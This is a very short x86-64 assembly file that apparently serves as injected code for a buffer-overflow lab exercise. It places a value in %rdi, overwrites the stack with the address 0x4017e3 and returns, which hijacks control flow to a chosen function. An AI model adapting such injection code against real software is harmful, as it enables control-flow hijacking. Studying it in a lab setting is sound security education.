.section .data

.section .bss

.section .text
.globl _start
_start: 
movq $0x55670e98, %rdi
movq $0x4017e3, (%rsp)
ret
